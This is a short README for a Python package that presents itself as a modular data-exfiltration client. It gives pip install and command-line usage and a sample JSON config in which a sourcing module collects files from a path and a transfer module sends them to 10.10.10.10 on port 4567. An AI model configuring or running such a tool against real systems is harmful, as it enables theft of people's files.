# Description

Network Protocol Data Exfiltration Project Client - A modular approach for data exfiltration

# Installation

`pip install npdep_client`

# Usage

**From command line:**

`python -m npdep_client [-h] --config CONFIG`

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
|--config | -c | String | - | Path to Configuration File |

# Configuration

```json
{
    "options":{
       "modulePath": "path/to/modules" // By providing a path, you can load modules not installed via pip
    },
    "sourcing": {
        "module": {
            "name": "SourcingModule",   // Name of the module .py file
            "options": {                // Custom options object for your specific module
                "path": "path/to/files" // Example: This module searches for files under the given path
            }
        }
    },
    "transfer": {
        "module": {
            "name": "TransferModule",   // Name of the module .py file
            "options": {                // Custom options object for your specific module
                "ip": "10.10.10.10",    // Example: Send files to given ip on given port
                "port": 4567
            }
        }
    }
}
```


# Example

`python -m npdep_client -c config.json`

Given the previous configuration file `npdep_client` is going to start `SourcingModule` which searches for files under `path/to/files` and send it via `TransferModule` to `10.10.10.10` under port `4567`